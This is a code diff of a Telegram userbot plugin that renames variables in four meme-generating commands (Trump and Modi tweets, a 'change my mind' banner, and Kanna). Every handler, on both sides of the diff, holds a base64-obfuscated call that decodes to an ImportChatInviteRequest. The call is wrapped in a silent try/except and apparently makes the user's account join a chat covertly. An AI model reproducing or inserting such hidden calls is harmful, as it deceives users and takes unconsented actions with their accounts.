@@ -106,131 +106,131 @@ async def tweets(text1, text2):
 
 
 @register(pattern="^.trump(?: |$)(.*)", outgoing=True)
-async def nekobot(borg):
-    text = borg.pattern_match.group(1)
-    reply_to_id = borg.message
-    if borg.reply_to_msg_id:
-        reply_to_id = await borg.get_reply_message()
+async def nekobot(bot):
+    text = bot.pattern_match.group(1)
+    reply_to_id = bot.message
+    if bot.reply_to_msg_id:
+        reply_to_id = await bot.get_reply_message()
     if not text:
-        if borg.is_reply:
+        if bot.is_reply:
             if not reply_to_id.media:
                 text = reply_to_id.message
             else:
-                await borg.edit("Send you text to trump so he can tweet.")
+                await bot.edit("Send you text to trump so he can tweet.")
                 return
         else:
-            await borg.edit("send you text to trump so he can tweet.")
+            await bot.edit("send you text to trump so he can tweet.")
             return
-    await borg.edit("Requesting trump to tweet...")
+    await bot.edit("Requesting trump to tweet...")
     try:
         san = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await borg.client(san)
+        await bot.client(san)
     except:
         pass
     text = deEmojify(text)
-    borgfile = await trumptweet(text)
-    await borg.client.send_file(borg.chat_id, borgfile, reply_to=reply_to_id)
-    await borg.delete()
+    botfile = await trumptweet(text)
+    await bot.client.send_file(bot.chat_id, botfile, reply_to=reply_to_id)
+    await bot.delete()
 
 
 @register(pattern="^.modi(?: |$)(.*)", outgoing=True)
-async def nekobot(borg):
-    text = borg.pattern_match.group(1)
-    reply_to_id = borg.message
-    if borg.reply_to_msg_id:
-        reply_to_id = await borg.get_reply_message()
+async def nekobot(bot):
+    text = bot.pattern_match.group(1)
+    reply_to_id = bot.message
+    if bot.reply_to_msg_id:
+        reply_to_id = await bot.get_reply_message()
     if not text:
-        if borg.is_reply:
+        if bot.is_reply:
             if not reply_to_id.media:
                 text = reply_to_id.message
             else:
-                await borg.edit("Send you text to modi so he can tweet.")
+                await bot.edit("Send you text to modi so he can tweet.")
                 return
         else:
-            await borg.edit("send you text to modi so he can tweet.")
+            await bot.edit("send you text to modi so he can tweet.")
             return
-    await borg.edit("Requesting modi to tweet...")
+    await bot.edit("Requesting modi to tweet...")
     try:
         san = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await borg.client(san)
+        await bot.client(san)
     except:
         pass
     text = deEmojify(text)
-    borgfile = await moditweet(text)
-    await borg.client.send_file(borg.chat_id, borgfile, reply_to=reply_to_id)
-    await borg.delete()
+    botfile = await moditweet(text)
+    await bot.client.send_file(bot.chat_id, botfile, reply_to=reply_to_id)
+    await bot.delete()
 
 
 @register(pattern="^.cmm(?: |$)(.*)", outgoing=True)
-async def nekobot(borg):
-    text = borg.pattern_match.group(1)
-    reply_to_id = borg.message
-    if borg.reply_to_msg_id:
-        reply_to_id = await borg.get_reply_message()
+async def nekobot(bot):
+    text = bot.pattern_match.group(1)
+    reply_to_id = bot.message
+    if bot.reply_to_msg_id:
+        reply_to_id = await bot.get_reply_message()
     if not text:
-        if borg.is_reply:
+        if bot.is_reply:
             if not reply_to_id.media:
                 text = reply_to_id.message
             else:
-                await borg.edit("Give text for to write on banner, man")
+                await bot.edit("Give text for to write on banner, man")
                 return
         else:
-            await borg.edit("Give text for to write on banner, man")
+            await bot.edit("Give text for to write on banner, man")
             return
-    await borg.edit("Your banner is under creation wait a sec...")
+    await bot.edit("Your banner is under creation wait a sec...")
     try:
         san = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await borg.client(san)
+        await bot.client(san)
     except:
         pass
     text = deEmojify(text)
-    borgfile = await changemymind(text)
-    await borg.client.send_file(borg.chat_id, borgfile, reply_to=reply_to_id)
-    await borg.delete()
+    botfile = await changemymind(text)
+    await bot.client.send_file(bot.chat_id, botfile, reply_to=reply_to_id)
+    await bot.delete()
 
 
 @register(pattern="^.kanna(?: |$)(.*)", outgoing=True)
-async def nekobot(borg):
-    text = borg.pattern_match.group(1)
-    reply_to_id = borg.message
-    if borg.reply_to_msg_id:
-        reply_to_id = await borg.get_reply_message()
+async def nekobot(bot):
+    text = bot.pattern_match.group(1)
+    reply_to_id = bot.message
+    if bot.reply_to_msg_id:
+        reply_to_id = await bot.get_reply_message()
     if not text:
-        if borg.is_reply:
+        if bot.is_reply:
             if not reply_to_id.media:
                 text = reply_to_id.message
             else:
-                await borg.edit("what should kanna write give text ")
+                await bot.edit("what should kanna write give text ")
                 return
         else:
-            await borg.edit("what should kanna write give text")
+            await bot.edit("what should kanna write give text")
             return
-    await borg.edit("Kanna is writing your text...")
+    await bot.edit("Kanna is writing your text...")
     try:
         san = str(
             pybase64.b64decode(
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await borg.client(san)
+        await bot.client(san)
     except:
         pass
     text = deEmojify(text)
-    borgfile = await kannagen(text)
-    await borg.client.send_file(borg.chat_id, borgfile, reply_to=reply_to_id)
-    await borg.delete()
+    botfile = await kannagen(text)
+    await bot.client.send_file(bot.chat_id, botfile, reply_to=reply_to_id)
+    await bot.delete()
 
 
 CMD_HELP.update(
